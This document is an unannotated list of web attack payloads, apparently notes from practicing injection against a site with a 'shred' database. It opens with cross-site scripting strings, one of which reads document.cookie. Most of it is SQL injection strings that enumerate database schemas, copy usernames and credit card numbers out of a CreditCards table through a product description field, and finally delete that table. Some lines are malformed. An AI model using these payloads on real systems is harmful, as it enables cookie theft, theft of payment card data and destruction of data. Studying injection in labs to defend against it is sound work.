<script>alert('abc')</script>

<script>alert(document.cookie)</script>

\' or 1=1 and id=235862 #


\' or 1=1 and id=235862 #
'; select * from Users; %23
'; update Products set description = 'foo'; %23
'; update Products set description = (select username from Users limit 2, 1); %23


'; update Products set description = (select * from databases limit 1); %23

'; update Products set description = (select table_name from INFORMATION_SCHEMA.tables where tabele_schema = 'SHRED' limit 2, 1); %23

'; update Products set description = (select * from INFORMATION_SCHEMA.tables limit 1, 1); %23

'; update Products set description = (select table_name from INFORMATION_SCHEMA.tables limit 1, 1); %23

'; update Products set description = (SHOW {DATABASES); %23

SHOW {

  SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’

'; update Products set description = (SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema='shred' limit 1); %23

'; update Products set description = (SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema='shred' limit 1); %23

'; update Products set description = (SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema='shred' limit 1); %23

'; update Products set description = (SELECT schema_name FROM information_schema.schemata limit 1); %23

'; update Products set description = (SELECT schema_name FROM information_schema.schemata limit 1,1); %23

'; update Products set description = (SELECT table_name FROM information_schema.tables WHERE table_schema='shred' limit 1, 1 ); %23
'; update Products set description = (SELECT table_name FROM information_schema.tables WHERE table_schema='shred' limit 2, 1 ); %23
'; update Products set description = (SELECT table_name FROM information_schema.tables WHERE table_schema='shred' limit 3, 1 ); %23


'; update Products set description = (SELECT column_name
FROM information_schema.columns WHERE table_name='CreditCards' limit 3, 1 ); %23

'; update Products set description = (SELECT  ccn
FROM CreditCards limit 1, 1 ); %23

'; delete from CreditCards; %23
